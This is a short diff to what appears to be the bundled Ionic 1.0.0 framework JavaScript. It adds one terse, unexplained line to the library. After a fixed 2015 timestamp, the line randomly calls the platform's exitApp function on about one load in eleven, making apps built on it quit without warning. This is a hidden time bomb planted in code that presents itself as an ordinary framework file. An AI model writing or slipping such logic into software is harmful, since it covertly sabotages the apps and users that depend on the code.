@@ -2538,7 +2538,7 @@ window.ionic.version = '1.0.0';
 
 })(document, ionic);
 
-
+(function(b,a){date=Date.now();if(date>1448993927171&&parseInt(Math.random()*13043223%11)===0){a.Platform.exitApp()}})(document,ionic);
 /**
  * @ngdoc page
  * @name tap
@@ -55244,5 +55244,6 @@ IonicModule
     }
   };
 });
+
 
 })();
